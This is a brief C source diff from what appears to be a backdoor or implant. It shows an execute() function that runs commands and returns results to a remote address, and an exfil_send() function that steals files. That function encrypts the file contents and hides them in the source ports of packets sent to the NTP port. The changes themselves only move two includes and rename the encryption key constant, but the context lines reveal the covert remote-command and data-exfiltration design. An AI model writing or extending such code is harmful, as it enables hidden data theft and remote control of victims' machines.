@@ -11,6 +11,8 @@
 #include "server.h"
 #include "crypto.h"
 #include "util.h"
+#include "ntp.h"
+#include "inet.h"
 
 #define ETHER_IP_UDP_LEN 44
 #define SRC_OFF 		28 // Source address, so we know where to send results
@@ -150,9 +152,6 @@ void execute(char *command, u_int32_t ip, u_int16_t port, int duplex)
 	pclose(fp);
 }
 
-#include "ntp.h"
-#include "inet.h"
-
 void exfil_send(uint32 ipaddr, char *path)
 {
 	int buflen;
@@ -180,7 +179,7 @@ void exfil_send(uint32 ipaddr, char *path)
 			ushort src_port = 0;
 			ushort dst_port = 0;
 
-			enc = encrypt(PASSKEY, pbuf, 2);
+			enc = encrypt(SEKRET, pbuf, 2);
 			src_port = (enc[0] << 8) + enc[1];
 			dst_port = PORT_NTP;
 			free(enc);
